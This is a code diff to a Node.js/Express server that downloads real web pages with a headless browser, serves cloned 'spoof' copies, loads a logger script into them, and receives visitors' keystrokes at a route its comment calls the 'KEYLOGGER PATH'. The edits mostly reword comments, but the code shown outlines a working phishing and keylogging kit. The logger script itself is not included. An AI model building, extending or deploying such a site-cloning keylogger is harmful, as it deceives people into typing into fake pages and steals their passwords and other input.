@@ -13,14 +13,14 @@ const log = console.log
 const PORT = 8888
 const app = exp()
 
-// PAGE CACHES
-// tmp testing pages
+//* PAGE CACHES
+//TODO: remove tmp testing pages below
 let downloaded_page = ''
 let rendered_page = ''
 // production pages
 const page_cache = new Cache() // build new cache object
 
-// LOGGER
+//* LOGGER
 const logger_script = fs.readFileSync(path.join(__dirname,'scripts', 'l.min.js'), 'utf-8')
 
 // check for args
@@ -32,12 +32,11 @@ if(args[2] && isURL(args[2])){
 
 } 
 
-// start headless browser
+// TODO: Move these into Page class so that each instantiated page handles its own lifecycle
 async function download_page(url){
     log('Fetching')
     const browser = await puppet.launch() // launch browser
     const page = await browser.newPage() // open page
-    page_object = page
     await page.goto(spoofURL, {
         waitUntil: "networkidle2"
     })
@@ -64,22 +63,20 @@ function render_page(url){
     log(`${spoofURL} spoof rendered.`)
 }
 
+
+
+// * PROGRAM ENTRY
 async function PROGRAM_START(){
     await download_page()
     render_page()
 }
-
-
-
-
-// Entry
 PROGRAM_START()
 
 
 
 
 
-// startup
+//* SERVER STARTUP
 app.listen(PORT, (err) => {
     if (err) log(err)
     log(`Server running on port ${PORT}`)
@@ -92,7 +89,7 @@ app.use('/scripts', exp.static('scripts'))
 app.use(exp.static('templates'))
 
 
-// ROUTING
+//* ROUTING
 // home test
 app.get('/home', (req, res)=>{
     res.sendFile(path.join(__dirname, "templates", "index.html"))
@@ -105,7 +102,7 @@ app.get('/:spoof_url', (req, res)=>{
     res.send(page_cache[req.params.spoof_url].rendered_page)
 })
 
-// main page
+//? Main Page
 app.get('/', (req, res) => {
     res.send(rendered_page)
 })
@@ -116,7 +113,7 @@ app.post('/spoof', async (req, res)=>{ // takes in post form url field, and crea
     let new_url = await create_spoof(url_2_spoof) // should return new path of spoofed page
     return res.redirect(`${new_url}`) // redirect to spoofed route /:spoof_url
 })
-// receive keys
+//? KEYLOGGER PATH
 app.post('/k', async (req, res)=>{
     // log(req.body.key)
 
@@ -124,13 +121,19 @@ app.post('/k', async (req, res)=>{
 
     return res.sendStatus(200)
 })
+//! Handle creation of new pages for caching
 async function create_spoof(url){ // creates spoof site and socket session, returns url for spoof
     let new_page = new Page()
     new_page.download_page = await download_page(url)
     new_page.rendered_page = await render_page(url)
     new_page.url = url
-    page_cache[url] = new_page // set into global pages object
+
+    // set into global pages object
+    page_cache[url] = new_page 
+    // page_cache.addPage()
+
     // create socket session
+
 
 
     return new_page.url
@@ -140,7 +143,7 @@ async function create_spoof(url){ // creates spoof site and socket session, retu
 
 
 
-// DEBUGGING
+//* DEBUGGING
 // easy to view log of rendered input/output
 async function createLog(string){
     let filename = "log.txt"
